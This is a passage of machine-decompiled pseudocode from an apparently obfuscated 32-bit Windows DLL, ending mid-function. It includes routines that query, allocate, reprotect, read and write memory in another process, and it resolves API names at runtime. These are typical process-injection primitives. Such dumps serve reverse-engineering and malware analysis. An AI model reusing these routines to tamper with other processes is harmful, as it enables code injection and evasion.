//----- (10027E37) --------------------------------------------------------
char *__thiscall sub_10027E37(char *this, char a2)
{
  char *v2; // esi

  v2 = this - 12;
  sub_10027E59((int)(this - 12));
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (10027E59) --------------------------------------------------------
void __usercall sub_10027E59(int a1@<eax>)
{
  _DWORD *v1; // esi

  v1 = (_DWORD *)(a1 + 12);
  sub_10027E6E((_DWORD *)(a1 + 12));
  sub_1001646C(v1);
}

//----- (10027E6E) --------------------------------------------------------
int __thiscall sub_10027E6E(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_100949FC;
  return sub_10027BFC(this);
}
// 100949FC: using guessed type int (__stdcall *off_100949FC)(char);

//----- (10027E9A) --------------------------------------------------------
_DWORD *__stdcall sub_10027E9A(_DWORD *a1)
{
  *a1 = &unk_10093BA8;
  a1[2] = &unk_10093BB0;
  sub_10016441(a1 + 3);
  sub_10027B8C(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10093BA0;
  return a1;
}
// 10093BA0: using guessed type int (__stdcall *off_10093BA0)(char);

//----- (10027EF1) --------------------------------------------------------
int __thiscall sub_10027EF1(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_10093BA0;
  return sub_10027BFC(this);
}
// 10093BA0: using guessed type int (__stdcall *off_10093BA0)(char);

//----- (10027F1D) --------------------------------------------------------
_DWORD *__stdcall sub_10027F1D(_DWORD *a1)
{
  *a1 = &unk_10094A1C;
  sub_10016441(a1 + 2);
  sub_100167F9(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10094A14;
  return a1;
}
// 10094A14: using guessed type int (__stdcall *off_10094A14)(char);

//----- (10027F6E) --------------------------------------------------------
_DWORD *__thiscall sub_10027F6E(_DWORD *this, char a2)
{
  _DWORD *v2; // esi
  _DWORD *v3; // edx

  v2 = this - 2;
  sub_10027FAB(this);
  sub_1001646C(v3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}
// 10027F81: variable 'v3' is possibly undefined

//----- (10027F9A) --------------------------------------------------------
void __thiscall sub_10027F9A(_DWORD *this)
{
  _DWORD *v1; // edx

  sub_10027FAB(this + 2);
  sub_1001646C(v1);
}
// 10027FA6: variable 'v1' is possibly undefined

//----- (10027FAB) --------------------------------------------------------
int __thiscall sub_10027FAB(_DWORD *this)
{
  int result; // eax

  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 2) + 4) - 8) = &off_10094A14;
  result = *(_DWORD *)(*(this - 2) + 4);
  *(_DWORD *)((char *)this + result - 8) = &off_1009362C;
  return result;
}
// 1009362C: using guessed type int (__stdcall *off_1009362C)(char);
// 10094A14: using guessed type int (__stdcall *off_10094A14)(char);

//----- (10027FE0) --------------------------------------------------------
_DWORD *__stdcall sub_10027FE0(_DWORD *a1, int a2)
{
  if ( a2 )
  {
    *a1 = &unk_100946D4;
    a1[2] = &unk_100946DC;
    sub_10016441(a1 + 3);
  }
  sub_10027B8C(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_100946CC;
  return a1;
}
// 100946CC: using guessed type int (__stdcall *off_100946CC)(char);

//----- (1002803D) --------------------------------------------------------
int __thiscall sub_1002803D(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_100946CC;
  return sub_10027BFC(this);
}
// 100946CC: using guessed type int (__stdcall *off_100946CC)(char);

//----- (10028069) --------------------------------------------------------
_DWORD *__stdcall sub_10028069(_DWORD *a1)
{
  *a1 = &unk_100946EC;
  a1[2] = &unk_100946F4;
  sub_10016441(a1 + 3);
  sub_10027FE0(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_100946E4;
  return a1;
}
// 100946E4: using guessed type int (__stdcall *off_100946E4)(char);

//----- (100280C0) --------------------------------------------------------
int __thiscall sub_100280C0(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_100946E4;
  return sub_1002803D(this);
}
// 100946E4: using guessed type int (__stdcall *off_100946E4)(char);

//----- (100280EC) --------------------------------------------------------
void __usercall sub_100280EC(_DWORD *a1@<edi>)
{
  int *v1; // eax
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-240h] BYREF
  int v3[2]; // [esp+20h] [ebp-230h] BYREF
  int v4; // [esp+28h] [ebp-228h]
  WCHAR Buffer[272]; // [esp+2Ch] [ebp-224h] BYREF
  int v6; // [esp+24Ch] [ebp-4h]

  v4 = 0;
  pExceptionObject[3] = a1;
  if ( !GetCurrentDirectoryW(0x104u, Buffer) )
  {
    sub_10027F1D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVUPQaqbVhsrnozqr_jhzi_sr__);
  }
  sub_1000CC20(v3, Buffer);
  v6 = 1;
  v1 = sub_100284A5(v3);
  sub_1000CE26(a1, (int)v1);
  v4 = 1;
  LOBYTE(v6) = 0;
  sub_1000CE59(v3);
  sub_1006A5A7();
}

//----- (10028183) --------------------------------------------------------
_DWORD *__thiscall sub_10028183(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10094A1C;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 2, v4);
  }
  sub_1000CAAE(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10094A14;
  return this;
}
// 10094A14: using guessed type int (__stdcall *off_10094A14)(char);

//----- (100281F2) --------------------------------------------------------
void __usercall sub_100281F2(_DWORD *a1@<edi>)
{
  int *v1; // eax
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-240h] BYREF
  int v3[2]; // [esp+20h] [ebp-230h] BYREF
  int v4; // [esp+28h] [ebp-228h]
  WCHAR Buffer[272]; // [esp+2Ch] [ebp-224h] BYREF
  int v6; // [esp+24Ch] [ebp-4h]

  v4 = 0;
  pExceptionObject[3] = a1;
  if ( !GetWindowsDirectoryW(Buffer, 0x104u) )
  {
    sub_10027F1D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVUPQaqbVhsrnozqr_jhzi_sr__);
  }
  sub_1000CC20(v3, Buffer);
  v6 = 1;
  v1 = sub_100284A5(v3);
  sub_1000CE26(a1, (int)v1);
  v4 = 1;
  LOBYTE(v6) = 0;
  sub_1000CE59(v3);
  sub_1006A5A7();
}

//----- (10028289) --------------------------------------------------------
void __usercall sub_10028289(_DWORD *a1@<edi>)
{
  int *v1; // eax
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-240h] BYREF
  int v3[2]; // [esp+20h] [ebp-230h] BYREF
  int v4; // [esp+28h] [ebp-228h]
  WCHAR Buffer[272]; // [esp+2Ch] [ebp-224h] BYREF
  int v6; // [esp+24Ch] [ebp-4h]

  v4 = 0;
  pExceptionObject[3] = a1;
  if ( !GetSystemDirectoryW(Buffer, 0x104u) )
  {
    sub_10027F1D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVUPQaqbVhsrnozqr_jhzi_sr__);
  }
  sub_1000CC20(v3, Buffer);
  v6 = 1;
  v1 = sub_100284A5(v3);
  sub_1000CE26(a1, (int)v1);
  v4 = 1;
  LOBYTE(v6) = 0;
  sub_1000CE59(v3);
  sub_1006A5A7();
}

//----- (10028320) --------------------------------------------------------
void __usercall sub_10028320(_DWORD *a1@<edi>)
{
  int *v1; // eax
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-240h] BYREF
  int v3[2]; // [esp+20h] [ebp-230h] BYREF
  int v4; // [esp+28h] [ebp-228h]
  WCHAR Buffer[272]; // [esp+2Ch] [ebp-224h] BYREF
  int v6; // [esp+24Ch] [ebp-4h]

  v4 = 0;
  pExceptionObject[3] = a1;
  if ( !GetTempPathW(0x104u, Buffer) )
  {
    sub_10027F1D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVUPQaqbVhsrnozqr_jhzi_sr__);
  }
  sub_1000CC20(v3, Buffer);
  v6 = 1;
  v1 = sub_100284A5(v3);
  sub_1000CE26(a1, (int)v1);
  v4 = 1;
  LOBYTE(v6) = 0;
  sub_1000CE59(v3);
  sub_1006A5A7();
}

//----- (100283B7) --------------------------------------------------------
void __usercall sub_100283B7(_DWORD *a1@<esi>, int a2, int a3, int a4, int a5)
{
  _DWORD pExceptionObject[5]; // [esp+10h] [ebp-22Ch] BYREF
  WCHAR TempFileName[266]; // [esp+24h] [ebp-218h] BYREF
  int v7; // [esp+238h] [ebp-4h]

  pExceptionObject[4] = 0;
  pExceptionObject[3] = a1;
  v7 = 2;
  if ( !GetTempFileNameW(*(LPCWSTR *)(a3 + 12), *(LPCWSTR *)(a5 + 12), 0, TempFileName) )
  {
    sub_10027F1D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVUPQaqbVhsrnozqr_jhzi_sr__);
  }
  sub_1000CC20(a1, TempFileName);
  LOBYTE(v7) = 1;
  sub_1000CE59(&a2);
  LOBYTE(v7) = 0;
  sub_1000CE59(&a4);
  sub_1006A5A7();
}

//----- (1002844F) --------------------------------------------------------
_DWORD *__cdecl sub_1002844F(_DWORD *a1)
{
  int v1; // ecx
  int v3; // [esp-8h] [ebp-38h] BYREF
  int v4; // [esp-4h] [ebp-34h]
  int v5[11]; // [esp+0h] [ebp-30h] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  v5[8] = 0;
  v5[7] = (int)v5;
  sub_1000CE26(v5, (int)&unk_100BF79C);
  v6 = 1;
  v4 = v1;
  v3 = v1;
  v5[6] = (int)&v3;
  sub_10028320(&v3);
  LOBYTE(v6) = 0;
  sub_100283B7(a1, v3, v4, v5[0], v5[1]);
  return a1;
}
// 1002847A: variable 'v1' is possibly undefined

//----- (100284A5) --------------------------------------------------------
int *__thiscall sub_100284A5(int *this)
{
  int v3[5]; // [esp+10h] [ebp-18h] BYREF
  int v4; // [esp+24h] [ebp-4h]

  if ( *(_WORD *)sub_1000CF9F(this, *(_DWORD *)(this[1] + 28) - 1) != 92 )
  {
    sub_1000CC20(v3, asc_100B701C);
    v4 = 0;
    sub_1000CFB9((int)this, (int)v3);
    v4 = -1;
    sub_1000CE59(v3);
  }
  return this;
}
// 100B701C: using guessed type wchar_t asc_100B701C[2];
// 100284A5: using guessed type int var_18[5];

//----- (100284F7) --------------------------------------------------------
int *__stdcall sub_100284F7(int a1, int a2, HANDLE hToken)
{
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-18h] BYREF

  pExceptionObject[5] = 0;
  dword_100BBC40 = (int)&off_10094A24;
  if ( !CreateEnvironmentBlock(&Environment, hToken, 0) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10024B5F(&a1);
  return &dword_100BBC40;
}
// 10094A24: using guessed type int (__thiscall *off_10094A24)(void *Block, char);
// 100BBC40: using guessed type int dword_100BBC40;

//----- (10028556) --------------------------------------------------------
LPVOID *__thiscall sub_10028556(LPVOID *Block, char a2)
{
  sub_10028575(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10028575) --------------------------------------------------------
BOOL __thiscall sub_10028575(LPVOID *this)
{
  *this = &off_10094A24;
  return DestroyEnvironmentBlock(this[1]);
}
// 10094A24: using guessed type int (__thiscall *off_10094A24)(void *Block, char);

//----- (100285A8) --------------------------------------------------------
int __thiscall sub_100285A8(_DWORD *this)
{
  return this[1];
}

//----- (100285B2) --------------------------------------------------------
int *__cdecl sub_100285B2(int *a1, int a2)
{
  _ThrowInfo *v2; // ecx
  char *ModuleHandleA; // edi
  int *p_pExceptionObject; // eax
  char *v5; // eax
  int v6; // eax
  int v7; // eax
  _ThrowInfo *v9; // [esp-8h] [ebp-50h] BYREF
  _ThrowInfo *v10; // [esp-4h] [ebp-4Ch]
  char v11[8]; // [esp+10h] [ebp-38h] BYREF
  __int16 v12; // [esp+18h] [ebp-30h] BYREF
  __int16 v13; // [esp+1Ah] [ebp-2Eh]
  __int16 *v14; // [esp+1Ch] [ebp-2Ch]
  _DWORD v15[2]; // [esp+20h] [ebp-28h] BYREF
  int v16; // [esp+28h] [ebp-20h]
  char *pExceptionObject; // [esp+2Ch] [ebp-1Ch] BYREF
  __int16 v18[2]; // [esp+30h] [ebp-18h] BYREF
  int v19[4]; // [esp+34h] [ebp-14h] BYREF
  int v20; // [esp+44h] [ebp-4h]

  v20 = 0;
  v16 = 0;
  v18[0] = 0;
  v19[0] = 0;
  v18[1] = 0;
  ModuleHandleA = (char *)GetModuleHandleA(aNtdllDll_2);
  if ( !ModuleHandleA )
  {
    sub_10016441(&pExceptionObject);
    v10 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = (int *)&pExceptionObject;
    goto LABEL_3;
  }
  v10 = v2;
  v9 = v2;
  pExceptionObject = (char *)&v9;
  sub_1000CC20(&v9, aRtlexpandenvir);
  v20 = 0;
  pExceptionObject = sub_100247C6(ModuleHandleA, (int)v9);
  v15[1] = &v9;
  sub_1000CC20(&v9, aRtlinitunicode);
  v20 = 0;
  v5 = sub_100247C6(ModuleHandleA, (int)v9);
  ((void (__stdcall *)(char *, _DWORD))v5)(v11, *(_DWORD *)(*(_DWORD *)(a2 + 4) + 12));
  v14 = v18;
  v12 = 0;
  v13 = 0;
  v6 = ((int (__stdcall *)(_DWORD, char *, __int16 *, int *))pExceptionObject)(0, v11, &v12, v19);
  if ( v6 != -1073741789 && v6 < 0 )
    goto LABEL_6;
  sub_1000CC90((unsigned int)v19[0] >> 1, a1);
  v20 = 0;
  v16 = 1;
  v14 = (__int16 *)sub_1000D0D9(a1);
  v7 = a1[1];
  v12 = 0;
  v13 = 2 * *(_DWORD *)(v7 + 28);
  v6 = ((int (__stdcall *)(_DWORD, char *, __int16 *, int *))pExceptionObject)(0, v11, &v12, v19);
  if ( v6 < 0 )
  {
LABEL_6:
    sub_1002EA34(v15, v6);
    v10 = (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__;
    p_pExceptionObject = v15;
LABEL_3:
    _CxxThrowException(p_pExceptionObject, v10);
  }
  sub_1000D118((int)a1);
  return a1;
}
// 100285FB: variable 'v2' is possibly undefined
// 100B6F84: using guessed type wchar_t aRtlexpandenvir[30];
// 100B6FC0: using guessed type wchar_t aRtlinitunicode[21];

//----- (100286E3) --------------------------------------------------------
_DWORD *__stdcall sub_100286E3(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10094A84;
  return a1;
}
// 10094A84: using guessed type int (__thiscall *off_10094A84)(void *Block, char);

//----- (10028711) --------------------------------------------------------
_DWORD *__thiscall sub_10028711(_DWORD *Block, char a2)
{
  sub_10028730(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10028730) --------------------------------------------------------
void __thiscall sub_10028730(_DWORD *this)
{
  *this = &off_10094A84;
  sub_1001646C(this);
}
// 10094A84: using guessed type int (__thiscall *off_10094A84)(void *Block, char);

//----- (10028754) --------------------------------------------------------
int __userpurge sub_10028754@<eax>(int a1@<ecx>, int a2@<edi>, int a3, int a4)
{
  _DWORD *v5; // edx
  unsigned int v7; // [esp-8h] [ebp-40h]
  struct _MEMORY_BASIC_INFORMATION v8; // [esp+10h] [ebp-28h] BYREF
  int v9; // [esp+34h] [ebp-4h]

  sub_10017FF0(a3);
  v9 = 0;
  sub_1002F467(a3 + 8);
  *(_DWORD *)a3 = &off_10094A2C;
  *v5 = &off_10094A58;
  sub_1000FF31(a2, (_DWORD *)(a3 + 16));
  LOBYTE(v9) = 2;
  *(_DWORD *)(a3 + 28) = 0;
  *(_DWORD *)(a3 + 32) = a1;
  *(_DWORD *)(a3 + 36) = a4;
  *(_BYTE *)(a3 + 40) = 0;
  if ( !a4 )
  {
    sub_100288D0(a3, &v8);
    *(_DWORD *)(a3 + 36) = v8.RegionSize;
    v7 = a1 - (unsigned int)v8.BaseAddress;
    *(_DWORD *)(a3 + 32) = v8.BaseAddress;
    sub_10028D2D((_DWORD *)a3, v7, 0);
  }
  return a3;
}
// 10028786: variable 'v5' is possibly undefined
// 10094A2C: using guessed type int (__thiscall *off_10094A2C)(void *Block, char);
// 10094A58: using guessed type int (__stdcall *off_10094A58)(int);

//----- (100287D9) --------------------------------------------------------
void *__thiscall sub_100287D9(void *Block, char a2)
{
  sub_10028854((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100287F8) --------------------------------------------------------
int __stdcall sub_100287F8(int a1)
{
  _DWORD *v1; // edx

  sub_10017FF0(a1);
  sub_1002F467(a1 + 8);
  *(_DWORD *)a1 = &off_10094A2C;
  *v1 = &off_10094A58;
  sub_1002271D((_DWORD *)(a1 + 16), 0, 0);
  *(_DWORD *)(a1 + 28) = 0;
  *(_DWORD *)(a1 + 32) = 0;
  *(_DWORD *)(a1 + 36) = 0;
  *(_BYTE *)(a1 + 40) = 0;
  return a1;
}
// 1002882B: variable 'v1' is possibly undefined
// 10094A2C: using guessed type int (__thiscall *off_10094A2C)(void *Block, char);
// 10094A58: using guessed type int (__stdcall *off_10094A58)(int);

//----- (10028854) --------------------------------------------------------
int __thiscall sub_10028854(int this)
{
  *(_DWORD *)this = &off_10094A2C;
  *(_DWORD *)(this + 8) = &off_10094A58;
  if ( *(_BYTE *)(this + 40) )
    sub_10028D85(this);
  sub_10001FCC((int *)(this + 16));
  sub_1002F4B5(this != 0 ? (_BYTE *)(this + 8) : 0);
  return sub_1001803E((_BYTE *)this);
}
// 10094A2C: using guessed type int (__thiscall *off_10094A2C)(void *Block, char);
// 10094A58: using guessed type int (__stdcall *off_10094A58)(int);

//----- (100288D0) --------------------------------------------------------
SIZE_T __userpurge sub_100288D0@<eax>(int a1@<esi>, PMEMORY_BASIC_INFORMATION lpBuffer)
{
  SIZE_T result; // eax
  _DWORD v3[3]; // [esp+0h] [ebp-Ch] BYREF

  memset(lpBuffer, 0, sizeof(struct _MEMORY_BASIC_INFORMATION));
  result = VirtualQueryEx(*(HANDLE *)(*(_DWORD *)(a1 + 20) + 16), *(LPCVOID *)(a1 + 32), lpBuffer, 0x1Cu);
  if ( !result )
  {
    sub_100286E3(&lpBuffer);
    _CxxThrowException(&lpBuffer, (_ThrowInfo *)&_TI2_AVDybrxgFqcfonPmswmegdy_gfjjefwq_sr__);
  }
  if ( result != 28 )
  {
    sub_100167F9(v3, 1);
    _CxxThrowException(v3, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 100288D0: using guessed type _DWORD var_C[3];

//----- (100289BC) --------------------------------------------------------
int __userpurge sub_100289BC@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_10013521();
  *(_DWORD *)(a1 + 32) = a2[8];
  *(_DWORD *)(a1 + 36) = a2[9];
  *(_DWORD *)(a1 + 28) = a2[7];
  *(_BYTE *)(a1 + 40) = 0;
  return a1;
}
// 10013521: using guessed type int sub_10013521(void);

//----- (100289F8) --------------------------------------------------------
DWORD __usercall sub_100289F8@<eax>(int a1@<esi>)
{
  struct _MEMORY_BASIC_INFORMATION v2; // [esp+0h] [ebp-1Ch] BYREF

  sub_100288D0(a1, &v2);
  return v2.Protect;
}

//----- (10028A0C) --------------------------------------------------------
char *__thiscall sub_10028A0C(char *this)
{
  return this + 16;
}

//----- (10028A10) --------------------------------------------------------
DWORD __usercall sub_10028A10@<eax>(int a1@<esi>)
{
  struct _MEMORY_BASIC_INFORMATION v2; // [esp+0h] [ebp-1Ch] BYREF

  sub_100288D0(a1, &v2);
  return v2.State;
}

//----- (10028A34) --------------------------------------------------------
BOOL __usercall sub_10028A34@<eax>(int a1@<esi>)
{
  return sub_10028A10(a1) == 0x10000;
}

//----- (10028A44) --------------------------------------------------------
BOOL __usercall sub_10028A44@<eax>(int a1@<esi>)
{
  return sub_10028A10(a1) == 0x2000;
}

//----- (10028AAA) --------------------------------------------------------
int __thiscall sub_10028AAA(int this, DWORD pExceptionObject)
{
  _DWORD v4[3]; // [esp+10h] [ebp-28h] BYREF
  _DWORD v5[3]; // [esp+1Ch] [ebp-1Ch] BYREF
  int v6[3]; // [esp+28h] [ebp-10h] BYREF
  int v7; // [esp+34h] [ebp-4h]

  if ( !sub_10028A44(this) )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6[0] = 128;
  sub_1002785C((int)v4, v6);
  v7 = 0;
  if ( !VirtualAllocEx(
          *(HANDLE *)(*(_DWORD *)(this + 20) + 16),
          *(LPVOID *)(this + 32),
          *(_DWORD *)(this + 36),
          0x1000u,
          pExceptionObject) )
  {
    sub_100167F9(v5, 1);
    _CxxThrowException(v5, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v7 = -1;
  return sub_10027930(v4);
}
// 10028AAA: using guessed type int var_10[3];
// 10028AAA: using guessed type _DWORD var_28[3];
// 10028AAA: using guessed type _DWORD var_1C[3];

//----- (10028B37) --------------------------------------------------------
int __thiscall sub_10028B37(_DWORD *this)
{
  return this[7] - this[5];
}

//----- (10028B3E) --------------------------------------------------------
DWORD __userpurge sub_10028B3E@<eax>(int a1@<edi>, DWORD flNewProtect)
{
  int v2; // eax
  DWORD v3; // esi
  _DWORD v5[3]; // [esp+10h] [ebp-2Ch] BYREF
  _DWORD pExceptionObject[3]; // [esp+1Ch] [ebp-20h] BYREF
  int v7; // [esp+28h] [ebp-14h] BYREF
  DWORD flOldProtect[3]; // [esp+2Ch] [ebp-10h] BYREF
  int v9; // [esp+38h] [ebp-4h]

  v7 = 128;
  sub_1002785C((int)v5, &v7);
  v9 = 0;
  v2 = *(_DWORD *)(a1 + 20);
  flOldProtect[0] = 0;
  if ( !VirtualProtectEx(*(HANDLE *)(v2 + 16), *(LPVOID *)(a1 + 32), *(_DWORD *)(a1 + 36), flNewProtect, flOldProtect) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v3 = flOldProtect[0];
  v9 = -1;
  sub_10027930(v5);
  return v3;
}
// 10028B3E: using guessed type _DWORD var_2C[3];
// 10028B3E: using guessed type DWORD flOldProtect[3];
// 10028B3E: using guessed type _DWORD pExceptionObject[3];

//----- (10028BB4) --------------------------------------------------------
int __thiscall sub_10028BB4(_DWORD *this, _DWORD *a2)
{
  int result; // eax
  wchar_t *v4; // eax
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // ebx
  int v11; // [esp-10h] [ebp-54h] BYREF
  int v12; // [esp-Ch] [ebp-50h]
  int v13; // [esp-8h] [ebp-4Ch] BYREF
  _ThrowInfo *v14; // [esp-4h] [ebp-48h]
  int v15; // [esp+14h] [ebp-30h] BYREF
  int v16; // [esp+18h] [ebp-2Ch] BYREF
  int pExceptionObject[3]; // [esp+1Ch] [ebp-28h] BYREF
  _DWORD v18[4]; // [esp+28h] [ebp-1Ch] BYREF
  int v19; // [esp+40h] [ebp-4h]

  result = a2[3];
  if ( result )
  {
    if ( (unsigned int)(result + this[7]) > this[9] )
    {
      sub_10016590(pExceptionObject);
      v14 = (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__;
      goto LABEL_4;
    }
    v15 = 0;
    v4 = (wchar_t *)sub_1000E943((int)&unk_100B6F38);
    v13 = v5;
    pExceptionObject[0] = (int)&v13;
    sub_1000CC20(&v13, v4);
    v19 = 0;
    v12 = v6;
    v11 = v6;
    v16 = (int)&v11;
    sub_1000CE26(&v11, (int)&unk_100BF76C);
    v19 = -1;
    pExceptionObject[0] = (int)sub_1002481B(v11, v12, v13);
    v16 = 128;
    sub_1002785C((int)v18, &v16);
    v19 = 2;
    v7 = a2[3];
    v14 = (_ThrowInfo *)&v15;
    v13 = v7;
    v8 = sub_10016C24(a2);
    if ( !((int (__stdcall *)(int, int, int, int, _ThrowInfo *))pExceptionObject[0])(
            v9,
            this[7] + this[8],
            v8,
            v13,
            v14)
      || (v10 = a2[3], v15 != v10) )
    {
      sub_100167F9(pExceptionObject, 1);
      v14 = (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__;
LABEL_4:
      _CxxThrowException(pExceptionObject, v14);
    }
    this[7] += v10;
    v19 = -1;
    return sub_10027930(v18);
  }
  return result;
}
// 10028C22: variable 'v5' is possibly undefined
// 10028C35: variable 'v6' is possibly undefined
// 10028C9B: variable 'v9' is possibly undefined
// 10028BB4: using guessed type _DWORD var_1C[4];

//----- (10028CEB) --------------------------------------------------------
LONG __thiscall sub_10028CEB(void *this, char a2)
{
  int v3; // eax
  int v5[7]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  v3 = sub_10016983((void *)1, (int)v5, &a2);
  v6 = 0;
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 12))(this, v3);
  v6 = -1;
  return sub_10016B53(v5);
}
// 10028CEB: using guessed type int var_20[7];

//----- (10028D29) --------------------------------------------------------
int __thiscall sub_10028D29(_DWORD *this)
{
  return this[7];
}

//----- (10028D2D) --------------------------------------------------------
unsigned int __thiscall sub_10028D2D(_DWORD *this, unsigned int pExceptionObject, int a3)
{
  int v3; // eax
  unsigned int result; // eax
  _DWORD v5[2]; // [esp+0h] [ebp-8h] BYREF

  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = this[7];
    }
    else
    {
      if ( a3 != 2 )
      {
        sub_10016441(&pExceptionObject);
        _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
      }
      v3 = this[9];
    }
    result = pExceptionObject + v3;
  }
  else
  {
    result = pExceptionObject;
  }
  if ( result >= this[9] )
  {
    sub_10016590(v5);
    _CxxThrowException(v5, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  this[7] = result;
  return result;
}
// 10028D2D: using guessed type _DWORD var_8[2];

//----- (10028D85) --------------------------------------------------------
BOOL __usercall sub_10028D85@<eax>(int a1@<eax>)
{
  BOOL result; // eax
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  result = sub_10028A34(a1);
  if ( !result )
  {
    result = VirtualFreeEx(*(HANDLE *)(*(_DWORD *)(a1 + 20) + 16), *(LPVOID *)(a1 + 32), 0, 0x8000u);
    if ( !result )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  return result;
}
// 10028D85: using guessed type _DWORD pExceptionObject[3];

//----- (10028DCD) --------------------------------------------------------
SIZE_T __thiscall sub_10028DCD(_DWORD *this, _DWORD *nSize)
{
  int v5; // eax
  char v6; // bl
  void *v7; // eax
  BOOL v8; // eax
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-14h] BYREF
  HANDLE hProcess; // [esp+10h] [ebp-8h]
  SIZE_T NumberOfBytesRead; // [esp+14h] [ebp-4h] BYREF
  unsigned int nSizea; // [esp+20h] [ebp+8h]

  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 28))(this) )
    return 0;
  nSizea = nSize[3];
  if ( nSizea >= this[7] - this[5] )
    nSizea = this[7] - this[5];
  v5 = nSize[1];
  NumberOfBytesRead = 0;
  v6 = *(_BYTE *)(v5 + 8);
  hProcess = *(HANDLE *)(this[3] + 16);
  v7 = (void *)sub_10016C00(nSize);
  v8 = ReadProcessMemory(hProcess, (LPCVOID)(this[5] + this[6]), v7, nSizea, &NumberOfBytesRead);
  if ( v6 )
    *(_BYTE *)(nSize[1] + 8) = 1;
  if ( !v8 || NumberOfBytesRead != nSizea )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  this[5] += nSizea;
  return NumberOfBytesRead;
}
// 10028DCD: using guessed type _DWORD pExceptionObject[3];

//----- (10028E6C) --------------------------------------------------------
char sub_10028E6C()
{
  return 1;
}

//----- (10028E6F) --------------------------------------------------------
int __thiscall sub_10028E6F(void *this, _BYTE *a2)
{
  int v3; // esi
  int v5[7]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  sub_10016983((void *)1, (int)v5, 0);
  v6 = 0;
  v3 = (*(int (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v5);
  if ( v3 == 1 )
    *a2 = *(_BYTE *)sub_10016C51((int)v5, 0);
  v6 = -1;
  sub_10016B53(v5);
  return v3;
}
// 10028E6F: using guessed type int var_20[7];

//----- (10028EC7) --------------------------------------------------------
BOOL __thiscall sub_10028EC7(_DWORD *this)
{
  return this[5] >= this[7];
}

//----- (10028ED9) --------------------------------------------------------
void *__thiscall sub_10028ED9(char *this, char a2)
{
  return sub_100287D9(this - 8, a2);
}

//----- (10028EE1) --------------------------------------------------------
int __thiscall sub_10028EE1(_DWORD *this)
{
  return sub_10028D29(this - 2);
}

//----- (10028EE9) --------------------------------------------------------
char sub_10028EE9()
{
  return sub_10028E6C();
}

//----- (10028EF1) --------------------------------------------------------
unsigned int __thiscall sub_10028EF1(_DWORD *this, unsigned int a2, int a3)
{
